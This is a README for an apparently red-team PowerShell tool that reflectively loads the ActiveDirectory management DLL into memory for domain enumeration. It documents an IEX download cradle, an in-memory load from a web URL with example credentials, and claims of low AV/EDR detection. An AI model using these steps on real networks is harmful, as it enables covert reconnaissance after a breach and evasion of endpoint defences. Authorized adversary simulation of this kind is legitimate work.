# ActiveDirectory Reflective DLL Module Loading 

## Description
The `import-ad.ps1` module can be imported or executed through an IEX cradle to reflectively load the ActiveDirectory module into any PowerShell session running on .NET CLR4.0+  
The ActiveDirectory DLL `Microsoft.ActiveDirectory.Management.dll` can be uploaded to the host and specified in the `-Path` parameter.  
Alternatively, the DLL can be hosted on a webserver, with optional Basic authentication, and reflectively loaded in memory without touching disk.  
Intended to be used on social engineering, assumed breach, and adversary simulation to enable robust AD enumeration. You can try using PowerView if you want, if you like losing shells that is.  
This technique, script included, is not unique to the ActiveDirectory module, as many native PS modules are imported from dll or psd1. If you find a PS module that can be imported through a native dll, this script would work just as well for that. This was just written with the express purpose of getting the AD module onto domain joined hosts early on in an engagement to enable AD enumeration.

## Usage
```
Syntax:
Import-AD [[-Path] <string>]
Import-AD [-URI <string>] [-Username <string>] [-Password <string>]

Examples:
Import-AD -Path C:\Microsoft.ActiveDirectory.Management.dll

Import-AD -URI https://contoso.com/ad.dll -Username XzcDqb5GqU1dJENS -Password m8mlY67jNYJdFDGdsz3a4nNmQW
```

## Files

| File | Purpose |
|:--- |:--- |
| `Microsoft.ActiveDirectory.Management.dll` | An authentic copy of the ActiveDirectory dll, copied directly from a Windows Server 2016. To be uploaded to target or hosted on a web server |
| `import-ad.ps1` | Import-AD PowerShell function to load the ActiveDirectory module. This can be uploaded to target, copied directly into a PowerShell terminal, or executed through an IEX cradle |
| `import-ad.b64` | Base64 encoded version of `import-ad.ps1` in UTF-16LE, to be used in an IEX cradle. |


## Notes
- Very low likelihood of being flagged by AV and EDR. Not 100% saying this will fly by, as the web method does use `net.webclient` to download binary data and `[System.Reflection.Assembly]` for the reflective loading
- The reflective loader is, generally, not needed for a dll already on disk. Typically you could just use `Import-Module <DLLPath>` with a compatible dll.
    - Perhaps it can bypass restrictions on module importing? I left it here because it should work 99+% of the time
- Modified from the original source on GitHub to not store the entire dll as a byte array, removed Get-Help sections, changed var names, added an HTTP downloader.

## Ref
[Original Source](https://github.com/samratashok/ADModule)
